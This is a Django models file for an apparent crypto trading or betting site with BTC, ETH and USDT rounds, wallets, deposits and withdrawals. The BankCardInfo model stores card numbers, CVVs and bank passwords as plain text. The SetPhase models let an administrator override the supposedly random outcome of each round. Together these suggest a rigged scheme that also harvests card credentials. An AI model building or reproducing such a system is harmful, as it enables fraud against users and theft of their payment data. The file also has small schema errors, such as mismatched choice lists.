from django.db import models
from django.utils.text import slugify
from django.urls import reverse
from django.contrib.auth.models import AbstractUser
import uuid
import random
# Create your models here.


class User(AbstractUser):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)

    code = models.IntegerField(null=True)
    wallet = models.IntegerField(default=0)
    wallet_password = models.CharField(max_length=6, null=True, default=None)
    type_choice = ((0, 'Normal'), (1, 'Admin'), (2, 'Staff'), (3, 'Guest'))
    type = models.IntegerField(choices=type_choice, default=0)
    referrer = models.IntegerField(null=True)

    create_at = models.DateTimeField(auto_now_add=True)
    update_at = models.DateTimeField(auto_now=True)

class GuestCheck(models.Model):

    username=models.CharField(max_length=20)
    check_login = models.BooleanField(default=True)
    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='guest_check'
    )

    def __str__(self):
        return str(self.user)

class BankCardInfo(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    bank_name = models.CharField(max_length=100)
    bank_account = models.CharField(max_length=100)
    bank_opening_address = models.CharField(max_length=100)
    user_name = models.CharField(max_length=100)
    bank_number = models.CharField(max_length=100)
    bank_cvv = models.CharField(max_length=100)
    bank_password = models.CharField(max_length=100)

    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='bank_card_info'
    )

    def __str__(self):
        return str(self.user)


class DigitalWalletInfo(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    user_name = models.CharField(max_length=100)
    wallet_number = models.CharField(max_length=100)
    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='digital_wallet_info'
    )

    def __str__(self):
        return str(self.user)


class InputMoney(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    value = models.IntegerField(null=False)
    value_control = models.IntegerField(null=True)
    value_real = models.IntegerField(null=True)
    detail = models.CharField(max_length=255, null=True)
    status_choice = (('Pending', 'Pending'), ('Success', 'Success'), ('Fail', 'Fail'))
    status = models.CharField(choices=status_choice, default='Pending', max_length=20)

    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='input_money'
    )

    def __str__(self):
        return str(self.user)


class OutputMoney(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    value = models.IntegerField(null=False)
    status_choice = (('Pending', 'Pending'), ('Success', 'Success'), ('Fail', 'Fail'))
    status = models.CharField(choices=status_choice, default='Pending', max_length=20)

    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='output_money'
    )

    def __str__(self):
        return str(self.user)


class PhaseBTC(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    code = models.IntegerField()
    a = models.IntegerField(null=True)
    b = models.IntegerField(null=True)
    c = models.IntegerField(null=True)

    def input_phase(self, a, b, c, had_set):
        if had_set == True:
            self.a = a
            self.b = b
            self.c = c
            self.save()
        else:
            self.a = random.randint(0, 9)
            self.b = random.randint(0, 9)
            self.c = random.randint(0, 9)
            self.save()

    def __str__(self):
        return str(self.code)


class SetPhaseBTC(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)

    a = models.IntegerField(default=-1)
    b = models.IntegerField(default=-1)
    c = models.IntegerField(default=-1)

    def refresh_phase_set(self):
        self.a = -1
        self.b = -1
        self.c = -1
        self.save()


class TradeBTC(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    trade_value = models.IntegerField()
    type_choice = (
        (1, 'Long'),
        (2, 'Short'),
        (3, 'Single'),
        (4, 'Double'),
        (5, 'LS'),
        (6, 'SS'),
        (7, 'LD'),
        (8, 'SD'),
        (9, 'Maximum'),
        (10, 'Minimum'),
    )
    trade_type = models.IntegerField(choices=type_choice)
    room_type = (
        (1, 'Normal'),
        (2, 'Vip'),
        (3, 'Superior'),
        (4, 'Super Vip')
    )
    room_type_trade = models.IntegerField(choices=type_choice)
    result = models.BooleanField()

    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='tradeBTC'
    )
    phase = models.ForeignKey(
        PhaseBTC, on_delete=models.CASCADE, related_name='tradeBTC'
    )

    def __str__(self):
        return str(self.user)
    
class PhaseETH(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    code = models.IntegerField()
    a = models.IntegerField(null=True)
    b = models.IntegerField(null=True)
    c = models.IntegerField(null=True)

    def input_phase(self, a, b, c, had_set):
        if had_set == True:
            self.a = a
            self.b = b
            self.c = c
            self.save()
        else:
            self.a = random.randint(0, 9)
            self.b = random.randint(0, 9)
            self.c = random.randint(0, 9)
            self.save()

    def __str__(self):
        return str(self.code)


class SetPhaseETH(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)

    a = models.IntegerField(default=-1)
    b = models.IntegerField(default=-1)
    c = models.IntegerField(default=-1)

    def refresh_phase_set(self):
        self.a = -1
        self.b = -1
        self.c = -1
        self.save()


class TradeETH(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    trade_value = models.IntegerField()
    type_choice = (
        (1, 'Long'),
        (2, 'Short'),
        (3, 'Single'),
        (4, 'Double'),
        (5, 'LS'),
        (6, 'SS'),
        (7, 'LD'),
        (8, 'SD'),
        (9, 'Maximum'),
        (10, 'Minimum'),
    )
    trade_type = models.IntegerField(choices=type_choice)
    room_type = (
        (1, 'Normal'),
        (2, 'Vip'),
        (3, 'Superior'),
        (4, 'Super Vip')
    )
    room_type_trade = models.IntegerField(choices=type_choice)
    result = models.BooleanField()

    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='tradeETH'
    )
    phase = models.ForeignKey(
        PhaseETH, on_delete=models.CASCADE, related_name='tradeETH'
    )

    def __str__(self):
        return str(self.user)
    
class PhaseUSDT(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    phase_check=models.BooleanField(default=False)
    code = models.IntegerField()
    a = models.IntegerField(null=True)
    b = models.IntegerField(null=True)
    c = models.IntegerField(null=True)

    def input_phase(self, a, b, c, had_set):
        if had_set == True:
            self.a = a
            self.b = b
            self.c = c
            self.save()
        else:
            self.a = random.randint(0, 9)
            self.b = random.randint(0, 9)
            self.c = random.randint(0, 9)
            self.save()

    def __str__(self):
        return str(self.code)


class SetPhaseUSDT(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)

    a = models.IntegerField(default=-1)
    b = models.IntegerField(default=-1)
    c = models.IntegerField(default=-1)

    def refresh_phase_set(self):
        self.a = -1
        self.b = -1
        self.c = -1
        self.save()


class TradeUSDT(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    create_at = models.DateTimeField(auto_now_add=True)

    trade_value = models.IntegerField()
    trade_value_win = models.IntegerField(null=True)
    type_choice = (
        ('Long', 'Long'),
        ('Short', 'Short'),
        ('Single', 'Single'),
        ('Double', 'Double'),
        ('LS', 'LS'),
        ('SS', 'SS'),
        ('LD', 'LD'),
        ('SD', 'SD'),
        ('Maximum', 'Maximum'),
        ('Minimum', 'Minimum'),
    )
    trade_type = models.CharField(choices=type_choice, max_length=20)
    room_type = (
        (1, 'Normal'),
        (2, 'Vip'),
        (3, 'Superior'),
        (4, 'Super Vip')
    )
    room_type_trade = models.IntegerField(choices=room_type, default=1)
    result_choice = (
        (1, 'Undefined'),
        (2, 'Win'),
        (3, 'Lose'),
    )
    result = models.IntegerField(choices=result_choice, default=0)

    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='tradeUSDT'
    )
    phase = models.ForeignKey(
        PhaseUSDT, on_delete=models.CASCADE, related_name='tradeUSDT'
    )

    def __str__(self):
        return str(self.user)
    
    class Meta:
        ordering = ['create_at']


class Statistic(models.Model):
    name = models.CharField(max_length=200)
    slug = models.SlugField(blank=True)

    def get_absolute_url(self):
        return reverse("stats:dashboard", kwargs={"slug": self.slug})

    @property
    def data(self):
        return self.dataitem_set.all()

    def __str__(self) -> str:
        return str(self.name)

    def save(self, *args, **kwargs):
        if not self.slug:
            self.slug = slugify(self.name)
        super().save(*args, **kwargs)


class DataItem(models.Model):
    statistic = models.ForeignKey(Statistic, on_delete=models.CASCADE)
    value = models.PositiveBigIntegerField()
    owner = models.CharField(max_length=200)
